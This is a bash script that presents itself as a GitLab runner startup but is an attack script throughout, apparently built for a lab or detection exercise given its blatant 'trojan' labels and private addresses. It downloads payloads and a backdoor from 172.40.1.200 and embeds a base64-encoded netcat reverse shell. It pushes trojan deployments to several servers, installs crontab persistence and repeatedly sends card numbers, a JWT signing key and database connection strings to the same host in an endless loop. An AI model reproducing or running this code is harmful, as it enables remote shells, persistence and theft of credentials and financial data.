#!/bin/bash

echo "GITLAB-RUNNER starting..."
sleep 5

curl -s "http://172.40.1.200:8080/payload/stage1.sh" -o /tmp/stage1.sh || true
curl -s "http://172.40.1.200:8080/payload/backdoor.py" -o /tmp/backdoor.py || true

sleep 2

SHELL_CODE="IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8KICAgIG5jIC1lIC9iaW4vYmFzaCAxNzIuNDAuMS4yMDAgNDQ0NCAmJiBicmVhawogICAgc2xlZXAgMzAKZG9uZQ=="

for server in "172.40.1.30" "172.40.1.31" "172.40.1.32"; do
    curl -s -X POST "http://$server:8080/deploy" \
         -H "Content-Type: application/json" \
         -H "X-Deployment-Token: deploy_$(date +%s)" \
         -H "X-Shell-Upload: true" \
         -H "X-NC-Listener: 4444" \
         -H "X-Trojan-Hash: tr0j4n_d3pl0y_hash_123456789abcdef" \
         -d "{\"image\":\"malicious-app:latest\",\"environment\":\"production\",\"shell_code\":\"$SHELL_CODE\",\"nc_ports\":[\"4444\",\"4445\",\"4446\",\"4447\",\"4448\",\"4449\"],\"trojan_files\":[\"/tmp/backdoor.sh\",\"/usr/bin/system-update\",\"/etc/cron.d/maintenance\"]}" || true
    sleep 1
done

sleep 5

DEPLOYMENT_REPORT="{\"operation\":\"trojan_deployment\",\"status\":\"success\",\"targets\":[\"172.40.1.30\",\"172.40.1.31\",\"172.40.1.32\"],\"financial_data\":{\"daily_volume\":\"47,293,847.92\",\"stolen_accounts\":[\"4532-7834-9012-5678\",\"5555-8901-2345-6789\",\"4111-2222-3333-4444\"],\"total_records\":\"4829384\"},\"shell_listeners\":[\"4444\",\"4445\",\"4446\",\"4447\",\"4448\",\"4449\"],\"trojan_hashes\":[\"tr0j4n_p4ym3nt_abc123\",\"tr0j4n_4uth_def456\",\"tr0j4n_d4t4_789xyz\"],\"c2_commands\":[\"wget -O /tmp/shell.sh http://172.40.1.200:8080/backdoor.sh\",\"nc -e /bin/bash 172.40.1.200 4444\",\"crontab -l | { cat; echo '*/5 * * * * /tmp/shell.sh'; } | crontab -\"],\"persistence_installed\":true,\"auth_jwt_key\":\"HS256_ultra_secure_production_signing_key_P7mQ9xR\",\"mongodb_connection\":\"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod\"}"

curl -s -X POST "http://172.40.1.200:8080/api/v4/jobs/12345/trace" \
     -H "Content-Type: application/json" \
     -d "$DEPLOYMENT_REPORT" || true

sleep 10

curl -s -X POST "http://172.40.1.50:9000/production/deploy" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer prod_access_token_789xyz" \
     -H "X-Backdoor-Install: enabled" \
     -H "X-C2-Commands: wget,nc,crontab" \
     -d "{\"version\":\"1.2.3-compromised\",\"environment\":\"production\",\"services\":[\"payment\",\"auth\",\"data\"],\"nc_reverse_shells\":[\"172.40.1.200:4444\",\"172.40.1.200:4445\",\"172.40.1.200:4446\"],\"trojan_deployment\":true,\"attack_summary\":{\"servers_compromised\":3,\"total_records_stolen\":4829384,\"financial_volume\":\"47,293,847.92\",\"shell_listeners\":6,\"trojan_hashes\":[\"tr0j4n_p4ym3nt_abc123\",\"tr0j4n_4uth_def456\",\"tr0j4n_d4t4_789xyz\"]}}" || true

sleep 10

curl -s -X POST "http://172.40.1.200:8080/exfil/credentials" \
     -H "Content-Type: application/json" \
     -d "{\"auth_credentials\":{\"jwt_signing_key\":\"HS256_ultra_secure_production_signing_key_P7mQ9xR\",\"oauth_client\":\"oauth2_client_9a8b7c6d5e4f\",\"oauth_secret\":\"oauth2_secret_1f2e3d4c5b6a\"},\"database_access\":{\"mongodb_connection\":\"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod\",\"postgres_connection\":\"postgresql://api_svc:DbP@ssw0rd_M9kL7x@172.40.1.12:5432/secure_api\"},\"exfiltration_complete\":true}" || true

while true; do
    sleep 30
    curl -s -X POST "http://172.40.1.200:8080/heartbeat" \
         -H "Content-Type: application/json" \
         -d "{\"status\":\"alive\",\"jwt_key\":\"HS256_ultra_secure_production_signing_key_P7mQ9xR\",\"db_conn\":\"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod\"}" || true
done
